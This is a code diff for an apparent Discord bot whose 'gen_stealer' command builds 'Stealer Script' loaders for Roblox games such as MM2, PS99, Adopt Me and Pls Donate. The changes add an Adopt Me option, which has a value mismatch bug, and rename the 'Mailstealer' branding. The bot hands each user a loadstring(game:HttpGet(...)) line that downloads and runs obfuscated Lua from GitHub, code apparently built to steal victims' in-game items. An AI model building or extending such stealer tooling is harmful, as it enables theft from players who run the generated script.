@@ -53,6 +53,7 @@ class SendFieldValueButton(discord.ui.Button):
 )
 @app_commands.choices(game_type=[
     app_commands.Choice(name="MM2", value="mm2"),
+    app_commands.Choice(name="Adopt Me", value="adoptme"),
     app_commands.Choice(name="PS99", value="ps99"),
     app_commands.Choice(name="Pls Donate", value="pls_donate"),
 ])
@@ -68,6 +69,8 @@ async def gen_stealer(
             url = "https://raw.githubusercontent.com/SharScript/MM2/main/Protected_MM2.lua"
         elif game_type.value == "ps99":
             url = "https://raw.githubusercontent.com/SharScript/PS99/main/Protected_PS99.lua"
+        elif game_type.value == "adopt_me":
+            url = "https://raw.githubusercontent.com/SharScript/Adopt-Me/refs/heads/main/Protected_AdoptMe.lua"
         elif game_type.value == "pls_donate":
             url = "https://raw.githubusercontent.com/SharScript/Pls-Donate/main/Protected_PlsDonate.lua"
         else:
@@ -120,13 +123,13 @@ async def gen_stealer(
             raw_url = f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/{filename}"
 
             embed = discord.Embed(
-                title="Mailstealer Script Generated",
+                title="Stealer Script Generated",
                 description="This script is generated exclusively for you",
                 color=discord.Color.gold()
             )
             embed.add_field(name="Script", value=f'```lua\nloadstring(game:HttpGet("{raw_url}", true))()```', inline=False)
-            embed.set_footer(text="Bot & Universal Stealer by Mori Team")
-            embed.set_thumbnail(url="https://static.wikia.nocookie.net/pet-simulator/images/8/88/Mailbox-Release.png/revision/latest?cb=20240114132246")
+            embed.set_footer(text="Made By Pethical")
+            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1299029863427997777/1372862855715491840/tiktokio.com_CT6hHUPDendSN7vG8p5e.mp4?ex=682851ab&is=6827002b&hm=b851b4e351d4ba68a8af69794a139e3d30f8bfc35e7085cf976921d66d2ae4c6&")
 
             view = discord.ui.View()
             view.add_item(SendFieldValueButton(embed))
@@ -147,7 +150,7 @@ async def gen_stealer(
 @bot.event
 async def on_ready():
     await tree.sync()
-    await bot.change_presence(activity=discord.Game(name=".gg/PzWY2QX8cu"))
+    await bot.change_presence(activity=discord.Game(name=".gg/F3bb3e8VBe"))
     print(f"success host {bot.user}")
 
 if not BOT_TOKEN:
